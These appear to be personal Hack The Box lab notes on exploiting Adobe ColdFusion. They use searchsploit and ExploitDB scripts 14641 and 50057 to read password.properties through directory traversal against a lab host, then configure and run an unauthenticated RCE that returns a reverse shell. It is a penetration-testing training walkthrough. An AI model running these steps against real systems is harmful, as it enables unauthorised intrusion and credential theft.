#### Searchsploit

```shell
3kjS@htb[/htb]$ searchsploit adobe coldfusion
```
![](Screenshot%202026-08-02%20at%2020.28.06.png)
## Directory Traversal

```shell
3kjS@htb[/htb]$ searchsploit -p 14641
```
![](Screenshot%202026-08-02%20at%2020.57.30.png)
#### Coldfusion - Exploitation

```shell
3kjS@htb[/htb]$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py . 
3kjS@htb[/htb]$ python2 14641.py

usage: 14641.py <host> <port> <file_path> 
example: 14641.py localhost 80 ../../../../../../../lib/password.properties 
if successful, the file will be printed
```
#### Coldfusion - Exploitation

```shell
3kjS@htb[/htb]$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```
![](Screenshot%202026-08-02%20at%2020.58.32.png)
## Unauthenticated RCE
#### Searchsploit

```shell
3kjS@htb[/htb]$ searchsploit -p 50057
```

```shell
3kjS@htb[/htb]$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```
#### Exploit Modification

```python
if __name__ == '__main__': 
# Define some information 
lhost = '10.10.14.55' # HTB VPN IP 
lport = 4444 # A port not in use on localhost 
rhost = "10.129.247.30" # Target IP 
rport = 8500 # Target Port 
filename = uuid.uuid4().hex
```
#### Exploitation

```shell
3kjS@htb[/htb]$ python3 50057.py
```
![](Screenshot%202026-08-02%20at%2021.00.20.png)
#### Reverse Shell
![](Screenshot%202026-08-02%20at%2021.00.41.png)
